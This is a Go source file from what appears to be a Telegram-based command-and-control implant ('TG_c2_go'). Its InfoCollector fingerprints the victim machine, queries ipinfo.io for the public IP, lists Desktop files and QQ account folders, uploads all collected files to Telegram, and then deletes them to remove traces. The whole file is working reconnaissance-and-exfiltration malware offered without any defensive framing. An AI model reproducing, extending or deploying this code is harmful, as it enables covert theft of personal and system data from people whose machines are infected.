package functions

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"time"

	"github.com/shirou/gopsutil/v3/cpu"
	"github.com/shirou/gopsutil/v3/disk"
	"github.com/shirou/gopsutil/v3/host"
	"github.com/shirou/gopsutil/v3/mem"

	"TG_c2_go/config"
	"TG_c2_go/telegram"
)

// InfoCollector 系统信息收集器
type InfoCollector struct {
	client *telegram.TelegramClient
}

// NewInfoCollector 创建新的信息收集器
func NewInfoCollector() *InfoCollector {
	return &InfoCollector{
		client: telegram.NewTelegramClient(),
	}
}

// collectSystemInfo 收集系统信息
func (ic *InfoCollector) collectSystemInfo() error {
	filePath := filepath.Join(config.OUTPUT_DIR, "system_info.txt")
	
	// 确保输出目录存在
	if err := os.MkdirAll(config.OUTPUT_DIR, 0755); err != nil {
		return fmt.Errorf("创建输出目录失败: %v", err)
	}
	
	file, err := os.OpenFile(filePath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		return fmt.Errorf("打开系统信息文件失败: %v", err)
	}
	defer file.Close()
	
	// 获取主机信息
	hostInfo, _ := host.Info()
	if hostInfo != nil {
		fmt.Fprintf(file, "系统名称: %s\\n", hostInfo.OS)
		fmt.Fprintf(file, "主机名: %s\\n", hostInfo.Hostname)
		fmt.Fprintf(file, "平台: %s\\n", hostInfo.Platform)
		fmt.Fprintf(file, "平台版本: %s\\n", hostInfo.PlatformVersion)
		fmt.Fprintf(file, "内核版本: %s\\n", hostInfo.KernelVersion)
		fmt.Fprintf(file, "启动时间: %s\\n", time.Unix(int64(hostInfo.BootTime), 0).Format("2006-01-02 15:04:05"))
	}
	
	// 获取内存信息
	memInfo, _ := mem.VirtualMemory()
	if memInfo != nil {
		fmt.Fprintf(file, "总内存: %d MB\\n", memInfo.Total/1024/1024)
		fmt.Fprintf(file, "可用内存: %d MB\\n", memInfo.Available/1024/1024)
		fmt.Fprintf(file, "已用内存: %d MB\\n", memInfo.Used/1024/1024)
		fmt.Fprintf(file, "内存使用率: %.2f%%\\n", memInfo.UsedPercent)
	}
	
	// 获取CPU信息
	cpuInfo, _ := cpu.Info()
	if len(cpuInfo) > 0 {
		fmt.Fprintf(file, "CPU型号: %s\\n", cpuInfo[0].ModelName)
		fmt.Fprintf(file, "CPU核心数: %d\\n", len(cpuInfo))
		fmt.Fprintf(file, "CPU频率: %.2f MHz\\n", cpuInfo[0].Mhz)
	}
	
	// 获取CPU使用率
	cpuPercent, _ := cpu.Percent(time.Second, false)
	if len(cpuPercent) > 0 {
		fmt.Fprintf(file, "CPU使用率: %.2f%%\\n", cpuPercent[0])
	}
	
	// 获取磁盘信息
	partitions, _ := disk.Partitions(false)
	for _, partition := range partitions {
		usage, err := disk.Usage(partition.Mountpoint)
		if err == nil {
			fmt.Fprintf(file, "磁盘: %s, 总空间: %.2f GB, 可用空间: %.2f GB, 使用率: %.2f%%\\n",
				partition.Mountpoint, 
				float64(usage.Total)/1000000000,
				float64(usage.Free)/1000000000,
				usage.UsedPercent)
		}
	}
	
	fmt.Printf("系统信息已写入: %s\\n", filePath)
	return nil
}

// collectNetworkInfo 收集网络信息
func (ic *InfoCollector) collectNetworkInfo() error {
	filePath := filepath.Join(config.OUTPUT_DIR, "net_info.txt")
	
	file, err := os.OpenFile(filePath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		return fmt.Errorf("打开网络信息文件失败: %v", err)
	}
	defer file.Close()
	
	// 获取本地网络接口信息
	fmt.Fprintf(file, "操作系统: %s\\n", runtime.GOOS)
	fmt.Fprintf(file, "架构: %s\\n", runtime.GOARCH)
	
	// 获取公网IP信息
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get("http://ipinfo.io")
	if err == nil {
		defer resp.Body.Close()
		body, err := io.ReadAll(resp.Body)
		if err == nil {
			fmt.Fprintf(file, "公网IP信息:\\n%s\\n", string(body))
		}
	} else {
		fmt.Fprintf(file, "获取公网IP信息失败: %v\\n", err)
	}
	
	fmt.Printf("网络信息已写入: %s\\n", filePath)
	return nil
}

// collectDesktopFiles 收集桌面文件信息
func (ic *InfoCollector) collectDesktopFiles() error {
	filePath := filepath.Join(config.OUTPUT_DIR, "deskfile_info.txt")
	
	file, err := os.OpenFile(filePath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		return fmt.Errorf("打开桌面文件信息文件失败: %v", err)
	}
	defer file.Close()
	
	// 获取用户主目录
	homeDir, err := os.UserHomeDir()
	if err != nil {
		return fmt.Errorf("获取用户主目录失败: %v", err)
	}
	
	// Windows桌面路径
	desktopPath := filepath.Join(homeDir, "Desktop")
	if runtime.GOOS == "windows" {
		desktopPath = filepath.Join(homeDir, "Desktop")
	} else {
		desktopPath = filepath.Join(homeDir, "Desktop")
	}
	
	// 读取桌面文件
	entries, err := os.ReadDir(desktopPath)
	if err != nil {
		fmt.Fprintf(file, "无法读取桌面目录 %s: %v\\n", desktopPath, err)
		return nil
	}
	
	fmt.Fprintf(file, "桌面文件列表 (%s):\\n", desktopPath)
	for _, entry := range entries {
		info, err := entry.Info()
		if err == nil {
			fmt.Fprintf(file, "文件名: %s, 大小: %d 字节, 修改时间: %s\\n",
				info.Name(), info.Size(), info.ModTime().Format("2006-01-02 15:04:05"))
		}
	}
	
	fmt.Printf("桌面文件信息已写入: %s\\n", filePath)
	return nil
}

// collectInstalledPrograms 收集已安装程序信息（Windows）
func (ic *InfoCollector) collectInstalledPrograms() error {
	if runtime.GOOS != "windows" {
		fmt.Println("程序列表收集仅支持Windows系统")
		return nil
	}
	
	filePath := filepath.Join(config.OUTPUT_DIR, "exe_list.txt")
	
	file, err := os.OpenFile(filePath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		return fmt.Errorf("打开程序列表文件失败: %v", err)
	}
	defer file.Close()
	
	// 在Go中，我们可以通过读取注册表或使用wmic命令来获取已安装程序
	// 这里使用简化版本，实际应用中可能需要使用golang.org/x/sys/windows/registry
	fmt.Fprintf(file, "已安装程序列表（简化版本）:\\n")
	fmt.Fprintf(file, "注意: 完整的程序列表需要使用Windows注册表API\\n")
	
	fmt.Printf("程序列表已写入: %s\\n", filePath)
	return nil
}

// collectQQInfo 收集QQ信息
func (ic *InfoCollector) collectQQInfo() error {
	filePath := filepath.Join(config.OUTPUT_DIR, "qq_list.txt")
	
	file, err := os.OpenFile(filePath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		return fmt.Errorf("打开QQ信息文件失败: %v", err)
	}
	defer file.Close()
	
	// 获取用户文档目录
	homeDir, err := os.UserHomeDir()
	if err != nil {
		fmt.Fprintf(file, "无法获取用户主目录: %v\\n", err)
		return nil
	}
	
	// Windows QQ目录通常在Documents/Tencent Files
	documentsDir := filepath.Join(homeDir, "Documents")
	qqDir := filepath.Join(documentsDir, "Tencent Files")
	
	entries, err := os.ReadDir(qqDir)
	if err != nil {
		fmt.Fprintf(file, "无法读取QQ目录 %s: %v\\n", qqDir, err)
		return nil
	}
	
	fmt.Fprintf(file, "QQ目录列表:\\n")
	for _, entry := range entries {
		if entry.IsDir() {
			fmt.Fprintf(file, "QQ目录: %s\\n", entry.Name())
		}
	}
	
	fmt.Printf("QQ信息已写入: %s\\n", filePath)
	return nil
}

// uploadDirectory 上传整个目录中的所有文件
func (ic *InfoCollector) uploadDirectory(dirPath string) error {
	entries, err := os.ReadDir(dirPath)
	if err != nil {
		return fmt.Errorf("读取目录失败: %v", err)
	}
	
	for _, entry := range entries {
		if !entry.IsDir() {
			filePath := filepath.Join(dirPath, entry.Name())
			if err := ic.client.UploadFile(filePath); err != nil {
				fmt.Printf("上传文件失败 %s: %v\\n", filePath, err)
			} else {
				fmt.Printf("上传文件成功: %s\\n", filePath)
			}
		}
	}
	
	return nil
}

// cleanupFiles 清理生成的文件
func (ic *InfoCollector) cleanupFiles() {
	files := []string{
		"deskfile_info.txt",
		"exe_list.txt", 
		"net_info.txt",
		"qq_list.txt",
		"system_info.txt",
	}
	
	for _, filename := range files {
		filePath := filepath.Join(config.OUTPUT_DIR, filename)
		if err := os.Remove(filePath); err == nil {
			fmt.Printf("删除文件成功: %s\\n", filename)
		} else {
			fmt.Printf("删除文件失败: %s - %v\\n", filename, err)
		}
	}
}

// CollectInfo 执行完整的信息收集流程
func (ic *InfoCollector) CollectInfo() error {
	fmt.Println("开始信息收集")
	
	// 收集各种系统信息
	if err := ic.collectSystemInfo(); err != nil {
		fmt.Printf("收集系统信息失败: %v\\n", err)
	}
	
	if err := ic.collectNetworkInfo(); err != nil {
		fmt.Printf("收集网络信息失败: %v\\n", err)
	}
	
	if err := ic.collectDesktopFiles(); err != nil {
		fmt.Printf("收集桌面文件信息失败: %v\\n", err)
	}
	
	if err := ic.collectInstalledPrograms(); err != nil {
		fmt.Printf("收集程序列表失败: %v\\n", err)
	}
	
	if err := ic.collectQQInfo(); err != nil {
		fmt.Printf("收集QQ信息失败: %v\\n", err)
	}
	
	// 上传所有收集的文件
	if err := ic.uploadDirectory(config.OUTPUT_DIR); err != nil {
		fmt.Printf("上传文件失败: %v\\n", err)
		return err
	}
	
	// 清理文件
	ic.cleanupFiles()
	
	fmt.Println("信息收集完成")
	return nil
}
